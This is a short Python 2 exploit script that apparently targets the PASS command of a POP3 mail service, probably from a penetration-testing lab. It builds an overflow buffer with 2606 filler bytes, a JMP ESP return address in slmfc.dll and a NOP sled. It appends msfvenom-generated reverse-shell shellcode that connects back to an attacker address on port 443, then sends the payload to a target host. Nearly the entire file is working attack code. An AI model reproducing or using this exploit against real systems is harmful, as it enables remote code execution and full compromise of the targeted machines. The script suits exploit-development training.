#1/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#msfvenom --payload windows/shell_reverse_tcp LHOST=10.11.0.176 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
#x86/shikata_ga_nai chosen with final size 351
#Final size of c file: 1500 bytes
shellcode = ("\xd9\xc4\xd9\x74\x24\xf4\x5e\xbf\x8e\xdc\x38\x76\x29\xc9\xb1"
"\x52\x83\xc6\x04\x31\x7e\x13\x03\xf0\xcf\xda\x83\xf0\x18\x98"
"\x6c\x08\xd9\xfd\xe5\xed\xe8\x3d\x91\x66\x5a\x8e\xd1\x2a\x57"
"\x65\xb7\xde\xec\x0b\x10\xd1\x45\xa1\x46\xdc\x56\x9a\xbb\x7f"
"\xd5\xe1\xef\x5f\xe4\x29\xe2\x9e\x21\x57\x0f\xf2\xfa\x13\xa2"
"\xe2\x8f\x6e\x7f\x89\xdc\x7f\x07\x6e\x94\x7e\x26\x21\xae\xd8"
"\xe8\xc0\x63\x51\xa1\xda\x60\x5c\x7b\x51\x52\x2a\x7a\xb3\xaa"
"\xd3\xd1\xfa\x02\x26\x2b\x3b\xa4\xd9\x5e\x35\xd6\x64\x59\x82"
"\xa4\xb2\xec\x10\x0e\x30\x56\xfc\xae\x95\x01\x77\xbc\x52\x45"
"\xdf\xa1\x65\x8a\x54\xdd\xee\x2d\xba\x57\xb4\x09\x1e\x33\x6e"
"\x33\x07\x99\xc1\x4c\x57\x42\xbd\xe8\x1c\x6f\xaa\x80\x7f\xf8"
"\x1f\xa9\x7f\xf8\x37\xba\x0c\xca\x98\x10\x9a\x66\x50\xbf\x5d"
"\x88\x4b\x07\xf1\x77\x74\x78\xd8\xb3\x20\x28\x72\x15\x49\xa3"
"\x82\x9a\x9c\x64\xd2\x34\x4f\xc5\x82\xf4\x3f\xad\xc8\xfa\x60"
"\xcd\xf3\xd0\x08\x64\x0e\xb3\x3c\x72\x10\xf3\x29\x86\x10\xf2"
"\x12\x0f\xf6\x9e\x74\x46\xa1\x36\xec\xc3\x39\xa6\xf1\xd9\x44"
"\xe8\x7a\xee\xb9\xa7\x8a\x9b\xa9\x50\x7b\xd6\x93\xf7\x84\xcc"
"\xbb\x94\x17\x8b\x3b\xd2\x0b\x04\x6c\xb3\xfa\x5d\xf8\x29\xa4"
"\xf7\x1e\xb0\x30\x3f\x9a\x6f\x81\xbe\x23\xfd\xbd\xe4\x33\x3b"
"\x3d\xa1\x67\x93\x68\x7f\xd1\x55\xc3\x31\x8b\x0f\xb8\x9b\x5b"
"\xc9\xf2\x1b\x1d\xd6\xde\xed\xc1\x67\xb7\xab\xfe\x48\x5f\x3c"
"\x87\xb4\xff\xc3\x52\x7d\x0f\x8e\xfe\xd4\x98\x57\x6b\x65\xc5"
"\x67\x46\xaa\xf0\xeb\x62\x53\x07\xf3\x07\x56\x43\xb3\xf4\x2a"
"\xdc\x56\xfa\x99\xdd\x72")

#A up until EIP
#send EIP to a JMP ESP instruction in slmfc.dll
#8 bytes of nop
#lastly, out 351 byte shellcode
buffer = 'A' * 2606  + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode


try:
    print "Sending evil buffer..."
    s.connect(('10.11.23.10', 110))
    data = s.recv(1024)
    s.send('USER username + \r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print '\nDone!'
except:
    print 'something went wrong'
